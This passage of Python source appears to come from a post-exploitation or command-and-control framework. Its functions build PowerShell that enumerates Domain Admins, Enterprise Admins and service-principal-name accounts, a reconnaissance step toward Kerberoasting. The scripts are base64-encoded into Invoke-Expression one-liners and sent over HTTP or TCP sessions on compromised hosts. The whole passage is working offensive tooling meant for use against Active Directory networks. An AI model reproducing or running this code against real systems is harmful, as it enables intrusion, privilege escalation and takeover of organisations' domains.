      $res = $searcher.FindOne()
      $domainAdmins = @()
      if ($res) {{ $domainAdmins = $res.Properties["member"] }}
      $searcher.Filter = "(CN=Enterprise Admins)"
      $res = $searcher.FindOne()
      $enterpriseAdmins = @()
      if ($res) {{ $enterpriseAdmins = $res.Properties["member"] }}

      if ((-not $domainAdmins) -and (-not $enterpriseAdmins)) {{ Write-Output "Nothing Found" }}
      else {{
        if ($domainAdmins) {{
          Write-Output "====Domain Admins===="
          foreach ($r in $domainAdmins) {{
            Write-Output $r.Properties["samaccountname"][0]
          }}
          Write-Output "\n"
        }}

        if ($enterpriseAdmins) {{
          Write-Output "====Enterprise Admins===="
          foreach ($r in $enterpriseAdmins) {{
            Write-Output $r.Properties["samaccountname"][0]
          }}
          Write-Output "\n"
        }}
      }}
  }}
}} catch {{
    {root}
    # LDAP fallback: grab the 'member' DNs then resolve each to samAccountName
    $searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root","(CN=Domain Admins)")
    $res = $searcher.FindOne()
    $domainAdmins = @()
    if ($res) {{ $domainAdmins = $res.Properties["member"] }}
    $searcher.Filter = "(CN=Enterprise Admins)"
    $res = $searcher.FindOne()
    $enterpriseAdmins = @()
    if ($res) {{ $enterpriseAdmins = $res.Properties["member"] }}

    if ((-not $domainAdmins) -and (-not $enterpriseAdmins)) {{ Write-Output "Nothing Found" }}
    else {{
      if ($domainAdmins) {{
        Write-Output "====Domain Admins===="
        foreach ($r in $domainAdmins) {{
          Write-Output $r.Properties["samaccountname"][0]
        }}
        Write-Output "\n"
      }}

      if ($enterpriseAdmins) {{
        Write-Output "====Enterprise Admins===="
        foreach ($r in $enterpriseAdmins) {{
          Write-Output $r.Properties["samaccountname"][0]
        }}
        Write-Output "\n"
      }}
    }}
}}
"""


    # encode & dispatch
    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
        "$ps=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"" + b64 + "\"));"
        "Invoke-Expression $ps"
    )

    if transport in ("http", "https"):
        out = shell.run_command_http(sid, one_liner)

    elif transport in ("tcp", "tls"):
        out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)

    else:
        return brightred + "[!] Unknown session transport!"

    if out:
        if "Failed to resolve DC!" in out:
            return brightred + "[!] Failed to resolve DC, use --dc‑ip or --domain with the correct IP/domain"
        
        elif "Nothing Found" in out:
            return brightred + "[!] No password policy found!"

        else:
            return out

def getspns(sid, domain=None, dc_ip=None, hashes=None):
    """
    getspns [-d <domain>] [--dc-ip <ip>]
    - No flags: lists every account (user or computer) that has one or more SPNs.
    - -d, --domain: target a specific AD domain.
    - --dc-ip:      target a specific DC by IP.
    """
    sess = session_manager.sessions.get(sid)
    if not sess:
        return brightred + "[!] Invalid session"
    transport = sess.transport.lower()

    # Resolve target DC/domain
    target = dc_ip or domain or None
    if target:
        dns_preamble = connection_builder(dc_ip, domain)
        if dns_preamble == "ERROR":
            return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain correctly"
        server_arg = "-Server $nb"
        root       = "$ldapPath = \"LDAP://$nb\"; $root = ([ADSI] $ldapPath).defaultNamingContext"
        spn_cmd = f"$spnfound = (Get-ADObject -Filter \"servicePrincipalName -like '*'\" {server_arg} -Properties servicePrincipalName,SamAccountName | Select-Object SamAccountName,servicePrincipalName)"
        all_cmd = f"$all = Get-ADObject -Filter \"servicePrincipalName -like '*'\" {server_arg} -Properties servicePrincipalName,SamAccountName"
    else:
        dns_preamble = ""
        server_arg   = ""
        root         = "$root = ([ADSI]\"LDAP://RootDSE\").defaultNamingContext"
        spn_cmd = f"$spnfound = (Get-ADObject -Filter \"servicePrincipalName -like '*'\" -Properties servicePrincipalName,SamAccountName | Select-Object SamAccountName,servicePrincipalName)"
        all_cmd = "$all = Get-ADObject -Filter \"servicePrincipalName -like '*'\" -Properties servicePrincipalName,SamAccountName"


    ps = f"""
{dns_preamble}
try {{
  if (Get-Command Get-ADObject -ErrorAction SilentlyContinue) {{
      {spn_cmd}
      [object[]]$results = @()
      Write-Host $spnfound
      if ($spnfound) {{
        foreach ($s in $spnfound) {{
          foreach ($n in $s.SamAccountName) {{
            $name = ('{{0}}' -f $($n))
            $clean = [Regex]::Escape($name)
            foreach ($r in $s.servicePrincipalName) {{
              Write-Output ("{{0}} -> {{1}}" -f $($clean), $($r))
            }}
          }}
        }}
      }} else {{ Write-Output "Nothing Found" }}

  }} else {{
      {root}
      $searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root","(servicePrincipalName=*)")
      $searcher.PageSize = 1000
      $results = $searcher.FindAll()
      foreach ($r in $results) {{
        $name = $r.Properties["sAMAccountName"][0]
        $clean = [Regex]::Escape($name)
        foreach ($spn in $r.Properties["serviceprincipalname"]) {{
          Write-Output ("{{0}} -> {{1}}" -f $clean, $spn)
        }}
      }}
  }}
}} catch {{
  {root}
  $searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root","(servicePrincipalName=*)")
  $searcher.PageSize = 1000
  $results = $searcher.FindAll()
  foreach ($r in $results) {{
    $name = $r.Properties["sAMAccountName"][0]
    $clean = [Regex]::Escape($name)
    foreach ($spn in $r.Properties["serviceprincipalname"]) {{
      Write-Output ("{{0}} -> {{1}}" -f $clean, $spn)
    }}
  }}
}}
"""

    # Base64‑encode & dispatch
    b64 = base64.b64encode(ps.encode('utf-16le')).decode()
    one_liner = (
        "$ps=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"" + b64 + "\"));"
        "Invoke-Expression $ps"
    )

    if transport in ("http", "https"):
        out = shell.run_command_http(sid, one_liner)

    elif transport in ("tcp", "tls"):
        out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)

    else:
        return brightred + "[!] Unknown session transport!"

    if out:
        if "Failed to resolve DC!" in out:
            return brightred + "[!] Failed to resolve DC, use --dc‑ip or --domain with the correct IP/domain"
        
        elif "Nothing Found" in out:
            return brightred + "[!] No password policy found!"

        else:
            out = out.replace("\\", "").replace("\\\\", "").replace("\\\\\\\\", "")
            return out